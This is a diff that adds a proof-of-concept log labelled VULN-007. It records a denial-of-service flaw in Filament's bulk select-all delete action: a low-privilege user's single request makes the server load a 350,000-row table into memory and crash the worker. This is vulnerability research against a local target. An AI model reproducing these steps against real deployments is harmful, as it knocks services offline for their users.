@@ -1,0 +1,15 @@
+========================================================================
+VULN-007: Bulk select-all hydrates the entire table into memory (DoS)
+========================================================================
+[INFO] target: http://localhost:21890
+[INFO] exercising: HasBulkActions::getSelectedTableRecordsQuery → whereKeyNot([]) + ->get()
+[SETUP] posts currently in table: 350000
+[SETUP] logging in as low-priv user ryan@filamentphp.com
+[STEP] mounting the DeleteBulkAction with select-all tracking (mountAction('delete', table+bulk context))
+[INFO] modal mounted in 0.09s (count for the confirm message is a cheap COUNT)
+[STEP] executing the mounted action (callMountedAction) → the framework resolves $records by hydrating the ENTIRE table (no cap, no chunk)
+[PROOF] callMountedAction returned HTTP 500 after 6.51s — worker crashed hydrating the whole selection
+[PROOF] app log: Allowed memory size of 536870912 bytes exhausted (tried to allocate 20480 bytes) {"userId":2,"exception":"[object] (Symfony\\Component\\ErrorHandler\\
+[PROOF] row count before=350000 after=350000 (UNCHANGED — OOM preceded any delete)
+[OK] exploit confirmed — select-all made the server hydrate the entire table in one request and OOM the worker, before performing any operation
+==> VULN-007: CONFIRMED — one request with select-all tracking hydrates the whole table → worker OOM (A:H); no rows deleted (crash preceded the operation)
